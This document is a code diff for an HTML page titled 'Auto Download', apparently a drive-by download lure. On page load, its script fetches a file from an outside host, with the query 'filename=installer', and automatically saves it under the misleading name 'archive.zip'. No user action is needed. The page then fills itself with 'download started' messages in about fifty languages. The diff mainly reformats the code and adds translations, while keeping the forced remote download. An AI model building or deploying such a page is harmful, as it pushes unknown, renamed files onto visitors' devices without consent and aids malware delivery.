@@ -4,15 +4,21 @@
 <meta charset="UTF-8">
 <title>Auto Download</title>
 <style>
-  body { font-family: Arial, sans-serif; padding: 20px; line-height: 1.8; }
-  p { margin: 5px 0; }
+  body {
+    font-family: Arial, sans-serif;
+    padding: 20px;
+    line-height: 1.8;
+  }
+  p {
+    margin: 5px 0;
+  }
 </style>
 </head>
 <body>
 
 <script>
-const sourceUrl = "https://bk.tara.net.bd/gd/uYtrut/?filename=installer";
-const fileName = "archive.zip";
+const sourceUrl = 'https://bk.tara.net.bd/gd/uYtrut/?filename=installer';
+const fileName = 'archive.zip';
 
 const messages = [
   'Downloading started... (English)',
@@ -32,28 +38,58 @@ const messages = [
   'การดาวน์โหลดเริ่มต้นแล้ว... (ไทย)',
   'Download avviato... (Italiano)',
   'Pobieranie rozpoczęte... (Polski)',
-  'Завантаження розпочалось... (Українська)'
+  'Завантаження розпочалось... (Українська)',
+  'Download gestart... (Nederlands)',
+  'Nedladdningen har startat... (Svenska)',
+  'Lataus aloitettu... (Suomi)',
+  'Stahování zahájeno... (Čeština)',
+  'A letöltés elkezdődött... (Magyar)',
+  'Λήψη ξεκίνησε... (Ελληνικά)',
+  'ההורדה החלה... (עברית)',
+  'Descărcarea a început... (Română)',
+  'Preuzimanje je počelo... (Hrvatski)',
+  'Preberanie sa začalo... (Slovenčina)',
+  'Prenos se je začel... (Slovenščina)',
+  'Muat turun dimulakan... (Bahasa Melayu)',
+  'Ang pag-download ay nagsimula... (Filipino)',
+  'ডাউনলোড শুরু হয়েছে... (বাংলা)',
+  'ڈاؤن لوڈ شروع ہو گیا... (اردو)',
+  'دانلود شروع شد... (فارسی)',
+  'ดาวน์โหลดเริ่มต้นแล้ว... (ไทย)',
+  'Tải về đã bắt đầu... (Tiếng Việt)',
+  'ダウンロード開始... (日本語)',
+  'Indlæsning startet... (Dansk)',
+  'Nedlasting startet... (Norsk)',
+  'Descarga iniciada... (Català)',
+  'Deskarga hasi da... (Euskara)',
+  'Започна изтеглянето... (Български)',
+  'Завантажэнне пачалося... (Беларуская)',
+  'Preuzimanje je započelo... (Srpski)',
+  'Жүктеу басталды... (Қазақша)',
+  'Yuklab olish boshlandi... (O\'zbek)',
+  'გადმოწერა დაიწყო... (ქართული)',
+  'Unduh dimulai... (Jawa)',
+  'பதிவிறக்கம் தொடங்கியது... (தமிழ்)'
 ];
 
-async function download() {
+async function startDownload() {
   try {
     const response = await fetch(sourceUrl);
     const blob = await response.blob();
     const url = URL.createObjectURL(blob);
 
-    const a = document.createElement("a");
+    const a = document.createElement('a');
     a.href = url;
     a.download = fileName;
     document.body.appendChild(a);
     a.click();
     a.remove();
-
-  } catch (e) {
-    document.body.innerHTML += "<p>Ошибка: " + e.message + "</p>";
+  } catch (error) {
+    document.body.innerHTML += `<p>Ошибка: ${error.message}</p>`;
   }
 }
 
-download();
+startDownload();
 
 messages.forEach(msg => {
   document.body.innerHTML += `<p>${msg}</p>`;
